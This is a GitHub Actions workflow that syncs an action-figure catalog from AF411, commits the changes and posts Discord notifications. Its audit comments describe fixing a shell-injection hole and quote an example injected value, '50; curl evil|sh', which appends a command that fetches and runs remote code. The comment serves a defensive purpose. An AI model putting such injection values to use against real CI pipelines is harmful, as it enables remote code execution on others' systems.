name: Sync AF411 Catalog

# ── Workflow v1.8 (security/reliability audit) ──────────────────────────
#   • run-name below stamps every run with the version for visual confirmation.
#   • workflow_dispatch string inputs are passed via env: (not interpolated
#     into run: blocks) to remove a shell script-injection vector.
#   • the commit/push and Discord steps gained an explicit success() guard so
#     they no longer run when the sync step failed.
run-name: "Sync AF411 Catalog v1.8 · ${{ github.event_name }}${{ inputs.line && format(' · {0}', inputs.line) || '' }}"

on:
  workflow_dispatch:
    inputs:
      line:
        description: 'Sync a specific line only (leave empty for all)'
        required: false
        default: ''
        type: choice
        options: ['', origins, masterverse, chronicles, classics, 200x, original, new-adventures, mondo, super7, eternia-minis]
      audit_only:
        description: 'Audit only (no changes committed)'
        required: false
        default: false
        type: boolean
      capture_upc:
        description: 'Also capture UPC barcodes (fetches one detail page per figure — slow; use occasionally, not daily)'
        required: false
        default: false
        type: boolean
      upc_limit:
        description: 'Cap UPC detail-page fetches this run (blank = no cap; e.g. 50 for a gentle first pass)'
        required: false
        default: ''
        type: string
  schedule:
    # 06:00 UTC daily (≈ 2am ET, 1am CT, 11pm PT)
    - cron: '0 6 * * *'

permissions:
  contents: write

jobs:
  sync:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repo
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.12'

      - name: Run sync script
        # AUDIT FIX (v1.8): bind all workflow_dispatch inputs + the event name
        # to environment variables here, and reference them as "$VAR" in the
        # script below. Previously inputs.upc_limit (a free-form `type: string`)
        # was interpolated directly into this run: block via ${{ }}, which is a
        # shell script-injection sink — a value like `50; curl evil|sh` would
        # have executed. Going through env: means the Actions template engine
        # never rewrites the script text with user data; the shell just reads
        # the variable. The other inputs (choice/boolean) were already
        # constrained, but are routed the same way for consistency.
        env:
          EVENT_NAME: ${{ github.event_name }}
          IN_LINE: ${{ inputs.line }}
          IN_AUDIT_ONLY: ${{ inputs.audit_only }}
          IN_CAPTURE_UPC: ${{ inputs.capture_upc }}
          IN_UPC_LIMIT: ${{ inputs.upc_limit }}
        run: |
          cd "$GITHUB_WORKSPACE"
          set -- python scripts/sync_af411.py
          # Scheduled runs are always commit-mode; manual runs respect audit_only.
          if [ "$EVENT_NAME" = "schedule" ] || [ "$IN_AUDIT_ONLY" != "true" ]; then
            set -- "$@" --commit
          else
            set -- "$@" --audit
          fi
          if [ -n "$IN_LINE" ]; then
            set -- "$@" --line "$IN_LINE"
          fi
          # UPC capture is MANUAL-ONLY and never runs on the daily schedule —
          # it costs one detail-page fetch per figure, so it's opt-in via the
          # workflow_dispatch toggle. The script itself is incremental (skips
          # figures that already have a upc), so repeat manual runs are cheap.
          if [ "$EVENT_NAME" != "schedule" ] && [ "$IN_CAPTURE_UPC" = "true" ]; then
            set -- "$@" --upc
            if [ -n "$IN_UPC_LIMIT" ]; then
              set -- "$@" --upc-limit "$IN_UPC_LIMIT"
            fi
          fi
          echo "Running: $*"
          "$@"

      - name: Commit and push changes
        # AUDIT FIX (v1.8): success() && (...). A bare `if:` overrides the
        # implicit success() gate, so the previous condition would run this
        # commit step even if the sync step had failed — risking a push of
        # partial/garbage state. The success() prefix restores that gate.
        if: ${{ success() && (github.event_name == 'schedule' || inputs.audit_only != 'true') }}
        env:
          EVENT_NAME: ${{ github.event_name }}
          IN_LINE: ${{ inputs.line }}
        run: |
          cd "$GITHUB_WORKSPACE"
          git config user.name "MOTU Vault Bot"
          git config user.email "motu-vault-bot@users.noreply.github.com"
          # Stage everything the scraper might have written.
          git add figures.json
          git add figures-pending.json 2>/dev/null || true
          git add figures-rejected.json 2>/dev/null || true
          git add "images/*.jpg" "images/*.png" 2>/dev/null || true
          if git diff --cached --quiet; then
            echo "No changes to commit"
            exit 0
          fi
          NEW_FIGS=$(git diff --cached --numstat figures.json 2>/dev/null | awk '{print $1}')
          NEW_PENDING=$(git diff --cached --numstat figures-pending.json 2>/dev/null | awk '{print $1}')
          NEW_IMGS=$(git diff --cached --name-only -- "*.jpg" | wc -l | tr -d ' ')
          LINE_MSG=""
          if [ -n "$IN_LINE" ]; then
            LINE_MSG=" ($IN_LINE)"
          fi
          TRIGGER="$EVENT_NAME"
          TIMESTAMP=$(date -u +"%Y-%m-%d %H:%M UTC")
          git commit -m "sync: update catalog from AF411${LINE_MSG} — ${TIMESTAMP} [${TRIGGER}]" \
                     -m "Figures: ${NEW_FIGS:-0} lines · Pending: ${NEW_PENDING:-0} lines · Images: ${NEW_IMGS}"
          # v1.7: push with rebase-and-retry. The earlier bare `git push` failed
          # with non-fast-forward when something else (a deploy-tool push, or an
          # overlapping run) landed on main between checkout and push. Rebasing
          # our single sync commit on top of the latest remote and retrying a
          # few times resolves that without a merge commit. figures.json changes
          # are generated wholesale, so on the rare content overlap the rebase
          # takes our freshly-built file (-X theirs from rebase's perspective).
          git config pull.rebase true
          PUSHED=0
          for attempt in 1 2 3; do
            if git push; then PUSHED=1; break; fi
            echo "⚠ push rejected (attempt $attempt) — rebasing on latest main…"
            git pull --rebase -X theirs origin main || git rebase --abort || true
            sleep 3
          done
          if [ "$PUSHED" != "1" ]; then
            echo "::error::Could not push after rebase retries — remote moved repeatedly."
            exit 1
          fi
          echo "✅ Changes committed and pushed"

      # v1.5: Discord notification when new figures land in the pending queue.
      # Reads the summary JSON the python script writes to /tmp on commit
      # runs. Skipped silently inside the step if no DISCORD_WEBHOOK_URL
      # secret is set or if no new pending figures were added (refreshes
      # don't notify).
      - name: Notify Discord on new pending figures
        # AUDIT FIX (v1.8): success() guard (see commit step) + github.repository
        # routed through env instead of inline ${{ }} interpolation.
        if: ${{ success() && (github.event_name == 'schedule' || inputs.audit_only != 'true') }}
        env:
          DISCORD_WEBHOOK_URL: ${{ secrets.DISCORD_WEBHOOK_URL }}
          GH_REPOSITORY: ${{ github.repository }}
        run: |
          if [ -z "$DISCORD_WEBHOOK_URL" ]; then
            echo "DISCORD_WEBHOOK_URL secret not set — skipping notification"
            exit 0
          fi
          SUMMARY=/tmp/motu-sync-summary.json
          if [ ! -f "$SUMMARY" ]; then
            echo "No summary file — skipping notification"
            exit 0
          fi
          COUNT=$(jq -r '.new_pending_count // 0' "$SUMMARY")
          if [ "$COUNT" -eq 0 ]; then
            echo "No new pending figures — skipping notification"
            exit 0
          fi
          NAMES=$(jq -r '
            .new_pending
            | (if length > 10 then .[0:10] else . end)
            | map(
                "• " + .name + (if .line and .line != "" then " (" + .line + ")" else "" end)
              )
            | join("\n")
          ' "$SUMMARY")
          EXTRA=$(jq -r 'if .new_pending_count > 10 then "…and " + ((.new_pending_count - 10) | tostring) + " more" else "" end' "$SUMMARY")
          PENDING_TOTAL=$(jq -r '.pending_total // 0' "$SUMMARY")
          REPO_URL="https://github.com/$GH_REPOSITORY"
          EDITOR_URL="https://shkankin.github.io/motu-images/figures-editor.html"
          # Build embed via jq for safe JSON escaping of any character in
          # figure names (apostrophes, ampersands, unicode, etc.).
          if [ -n "$EXTRA" ]; then
            DESC=$(printf '%s\n%s\n\n[Open editor →](%s) · [View commit →](%s/commits)' "$NAMES" "$EXTRA" "$EDITOR_URL" "$REPO_URL")
          else
            DESC=$(printf '%s\n\n[Open editor →](%s) · [View commit →](%s/commits)' "$NAMES" "$EDITOR_URL" "$REPO_URL")
          fi
          TITLE="🎬 ${COUNT} new figure in pending queue"
          if [ "$COUNT" -ne 1 ]; then TITLE="🎬 ${COUNT} new figures in pending queue"; fi
          jq -n \
            --arg title "$TITLE" \
            --arg desc  "$DESC" \
            --arg pending_total "$PENDING_TOTAL" \
            '{
              embeds: [{
                title:       $title,
                description: $desc,
                color:       16766720,
                footer:      { text: ("Total pending: " + $pending_total) },
                timestamp:   (now | todate)
              }]
            }' > /tmp/discord-payload.json
          HTTP=$(curl -sS -o /tmp/discord-resp.txt -w "%{http_code}" \
            -X POST -H "Content-Type: application/json" \
            --data @/tmp/discord-payload.json \
            "$DISCORD_WEBHOOK_URL")
          if [ "$HTTP" -ge 200 ] && [ "$HTTP" -lt 300 ]; then
            echo "✅ Discord notified ($COUNT new figures)"
          else
            echo "⚠ Discord webhook failed (HTTP $HTTP)"
            cat /tmp/discord-resp.txt
            # Don't fail the workflow over a notification — exit 0.
          fi
